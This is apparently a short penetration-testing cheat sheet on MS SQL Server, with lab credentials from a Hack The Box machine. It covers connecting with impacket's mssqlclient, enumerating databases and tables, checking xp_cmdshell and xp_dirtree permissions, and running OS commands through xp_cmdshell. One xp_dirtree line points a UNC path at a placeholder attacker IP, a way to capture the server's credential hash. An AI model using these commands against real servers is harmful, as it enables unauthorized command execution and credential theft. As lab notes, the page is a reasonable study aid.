---
slug: /tooling/ms-sql
pagination_next: null
pagination_prev: null
---

Connect with impacket-mssqlclient.py:

```bash
mssqlclient.py manager.htb/operator:operator@dc01.manager.htb -windows-auth
```

Show databases

```sql
SELECT name, database_id, create_date FROM sys.databases; 
```

Show tables
```sql
SELECT name FROM sys.tables;
```

Check if we have permission to run xp_*
```sql
EXEC sp_helprotect 'xp_cmdshell'
EXEC sp_helprotect 'xp_dirtree'
```

Execute code
```sql
EXEC xp_cmdshell whoami
```

List files
```sql
EXEC xp_dirtree '\\<attacker_IP>\any\thing'
EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
```